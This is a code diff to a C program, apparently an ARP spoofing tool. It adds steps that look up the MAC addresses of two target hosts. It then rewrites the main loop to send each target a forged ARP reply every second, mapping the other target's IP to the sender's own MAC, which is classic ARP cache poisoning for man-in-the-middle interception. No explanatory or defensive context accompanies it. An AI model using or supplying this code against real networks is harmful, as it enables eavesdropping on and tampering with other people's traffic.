@@ -121,10 +121,27 @@ int main(int argc, char **argv)
 
   /* ====================================================================== */
 
+  send_arp_request(sockfd, ifindex, ipaddr2, macaddr, target1_ip);
+
+  struct ether_arp reply1;
+  listen_arp_frame(sockfd, &reply1);
+  unsigned char *macaddr1 = reply1.arp_sha;
+  printf("Target 1 hardware address: %02x:%02x:%02x:%02x:%02x:%02x\n",
+    	 macaddr1[0],macaddr1[1],macaddr1[2],
+    	 macaddr1[3],macaddr1[4],macaddr1[5]);
+
+  send_arp_request(sockfd, ifindex, ipaddr1, macaddr, target2_ip);
+  struct ether_arp reply2;
+  listen_arp_frame(sockfd, &reply2);
+  unsigned char *macaddr2 = reply2.arp_sha;
+  printf("Target 2 hardware address: %02x:%02x:%02x:%02x:%02x:%02x\n",
+    	 macaddr2[0],macaddr2[1],macaddr2[2],
+    	 macaddr2[3],macaddr2[4],macaddr2[5]);
+
   while(1) {
-    send_arp_request(sockfd, ifindex, ipaddr1, macaddr, target2_ip);
+    send_arp_reply(sockfd, ifindex, ipaddr1, macaddr, target2_ip, macaddr2);
     sleep(1);
-    send_arp_request(sockfd, ifindex, ipaddr2, macaddr, target1_ip);
+    send_arp_reply(sockfd, ifindex, ipaddr2, macaddr, target1_ip, macaddr1);
     sleep(1);
   }
 
